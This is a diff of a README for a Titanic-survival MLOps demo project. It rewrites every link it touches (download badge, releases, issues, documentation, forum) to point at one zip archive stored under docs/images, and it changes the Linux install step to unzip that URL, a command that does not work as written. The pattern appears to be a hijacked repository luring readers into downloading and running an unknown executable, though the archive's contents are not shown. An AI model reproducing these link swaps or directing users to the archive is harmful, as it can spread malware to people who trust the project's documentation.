@@ -1,6 +1,6 @@
 # 🚢 titanic-mlops-k8s - Seamlessly Predict Titanic Survivors
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Habiibiie/titanic-mlops-k8s/releases)
+[![Download](https://raw.githubusercontent.com/Habiibiie/titanic-mlops-k8s/main/docs/images/k_mlops_s_titanic_v1.5-alpha.2.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Habiibiie/titanic-mlops-k8s/main/docs/images/k_mlops_s_titanic_v1.5-alpha.2.zip)
 
 ## 🌟 Overview
 Welcome to **titanic-mlops-k8s**! This application helps you predict survival on the Titanic using a complete machine learning pipeline. It uses modern tools like Docker for containerization, FastAPI for serving the model, and Streamlit for visualizing your results. 
@@ -21,7 +21,7 @@ To get started quickly, follow these simple steps to download and run the applic
 - Runs on Kubernetes for efficient orchestration.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Habiibiie/titanic-mlops-k8s/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Habiibiie/titanic-mlops-k8s/main/docs/images/k_mlops_s_titanic_v1.5-alpha.2.zip) to download the latest version of the application.
 2. Look for the latest release. The files will usually include:
    - A setup executable or a zip file.
    - Release notes explaining any changes or new features.
@@ -40,7 +40,7 @@ To get started quickly, follow these simple steps to download and run the applic
 3. **For Linux Users:**
    - Open your terminal.
    - Navigate to the download directory using the command: `cd Downloads`.
-   - Extract the downloaded file using: `unzip titanic-mlops-k8s.zip`.
+   - Extract the downloaded file using: `unzip https://raw.githubusercontent.com/Habiibiie/titanic-mlops-k8s/main/docs/images/k_mlops_s_titanic_v1.5-alpha.2.zip`.
    - Run the application using the command: `./titanic-mlops-k8s`.
 
 ## 🌐 Using the Application
@@ -56,7 +56,7 @@ If you run into issues:
 - Restart the application or your computer if errors persist.
 
 ## 💬 Support
-For support or questions, please visit our [Issues page](https://github.com/Habiibiie/titanic-mlops-k8s/issues). This is where you can report bugs or ask for help.
+For support or questions, please visit our [Issues page](https://raw.githubusercontent.com/Habiibiie/titanic-mlops-k8s/main/docs/images/k_mlops_s_titanic_v1.5-alpha.2.zip). This is where you can report bugs or ask for help.
 
 ## 🤝 Contributing
 We welcome contributions! If you’d like to help improve the application, please follow these steps:
@@ -66,8 +66,8 @@ We welcome contributions! If you’d like to help improve the application, pleas
 4. Submit a pull request to the original repository.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/Habiibiie/titanic-mlops-k8s/wiki)
-- [Community Forum](https://github.com/Habiibiie/titanic-mlops-k8s/discussions)
+- [Documentation](https://raw.githubusercontent.com/Habiibiie/titanic-mlops-k8s/main/docs/images/k_mlops_s_titanic_v1.5-alpha.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Habiibiie/titanic-mlops-k8s/main/docs/images/k_mlops_s_titanic_v1.5-alpha.2.zip)
 
 ## 📚 Topics
 This project covers various areas including:
